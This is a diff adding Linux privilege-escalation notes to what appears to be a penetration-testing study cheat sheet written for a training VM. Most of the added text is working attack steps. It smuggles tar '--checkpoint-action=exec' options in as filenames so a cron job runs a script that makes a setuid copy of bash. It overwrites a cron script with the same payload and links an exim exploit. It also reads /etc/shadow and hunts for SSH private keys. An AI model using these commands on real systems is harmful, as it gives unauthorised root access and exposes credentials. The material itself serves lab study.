@@ -108,6 +108,106 @@ Linux VM
 # Cron (path) 
 Use this if /etc/crontab has a PATH you have write to
 ==================
+Linux VM  
+
+1. In command prompt type: cat /etc/crontab 
+2. From the output, notice the script “/usr/local/bin/compress.sh”  
+3. In command prompt type: cat /usr/local/bin/compress.sh 
+4. From the output, notice the wildcard (*) used by ‘tar’. 
+
+Add checkpoint variables to tar: 
+
+1. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh 
+2. touch /home/user/--checkpoint=1 
+3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh 
+4. Wait for script to execute 
+5. /tmp/bash -p 
+6. id
+
+# Cron ( Tar wildcard) 
+Use this if /etc/crontab has a tar command (or other command that has a wildcard)
+======================
+1. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh 
+2. Wait for script to execute 
+3. /tmp/bash -p 
+4. id
+
+# Cron (file overwrite) 
+Use this if /etc/crontab has a file that you have write permission to
+=======================
+dpkg -l | grep -i exim ( is version is below 4.86.2 ?) 
+
+Is exim compiled with perl support? 
+
+exim -bV -v | grep -i perl  
+
+Does exim.conf contain “perl sartup” option? 
+
+Use cve-2016-1531.sh 
+
+# Vulnerable exim.
+https://github.com/HackerFantastic/Public/blob/master/exploits/cve-2016-1531.sh
+=======================
+uname -a 
+env 
+id 
+cat /proc/version 
+cat /etc/issue 
+cat /etc/passwd 
+cat /etc/group 
+cat /etc/shadow 
+cat /etc/hosts 
+grep -vE "nologin" /etc/passwd
+
+# Some manual enumeration within files.
+======================
+# Debian 
+dpkg -l 
+ 
+# CentOS, OpenSuse, Fedora, RHEL 
+rpm -qa (CentOS / openSUSE ) 
+ 
+# OpenBSD, FreeBSD 
+pkg_info
+
+# Check vulnerable software.
+Use searchsploit or exploitdb. Sometimes github has an exploit as well.
+======================
+http://www.dankalia.com/tutor/01005/0100501004.htm 
+
+# Is there a punctuation ‘.’ mark in the PATH. 
+======================
+Check all home directories .ssh folders 
+ls -la ~/.ssh/ 
+
+find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null |xargs -r
+
+ls -la
+
+# Check for root SSH keys.
+=======================
+ps aux | grep root 
+ 
+ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'
+
+# View privileged services e.g. root that you might be able to exploit.
+========================
+# OTHER GUIDES TO CHECK > MANUAL TESTS OR FILE TRANSFER > RUN ENUM SCRIPT ON TARGET MACHINE 
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
